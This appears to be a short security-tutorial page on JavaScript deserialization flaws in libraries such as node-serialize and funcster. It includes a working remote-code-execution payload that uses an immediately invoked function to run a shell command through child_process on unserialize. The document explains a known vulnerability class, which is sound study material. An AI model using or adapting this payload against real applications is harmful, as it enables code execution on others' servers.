Deserialization
========================================

Introduction
----------------------------------------
JavaScript itself does not have an implementation of deserialization, but some libraries such as node-serialize, serialize-to-js, etc. support the deserialization function. These libraries usually use JSON form to store data, but unlike the native functions JSON.parse and JSON.stringify, these libraries support the deserialization of any object, especially functions. If used improperly, deserialization problems may occur.

Payload structure
----------------------------------------
The following is the simplest example, first obtain the serialized output

.. code-block:: javascript

    var y = {
     rce : function(){
     require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
     },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));

After executing the above, it will return

.. code-block:: javascript

    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}"}

However, this payload will not be executed after deserialization, but JS supports Immediately Invoked Function Expression, such as ``(function () { /* code */ } ());``, which will execute the code in the function. Then you can use this method to modify the serialized string to complete a deserialization. The final payload test is as follows:


.. code-block:: javascript

    var serialize = require('node-serialize');
    var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
    serialize.unserialize(payload);


Payload structure II
----------------------------------------
The above mentioned is the construction method of deserialization libraries such as node-serialize. There is also a class of libraries such as funcster, which uses the direct splicing of string constructors to execute.

.. code-block:: javascript

    return "module.exports=(function(module,exports){return{" + entries + "};})();";

This way the payload can be constructed using corresponding closures.
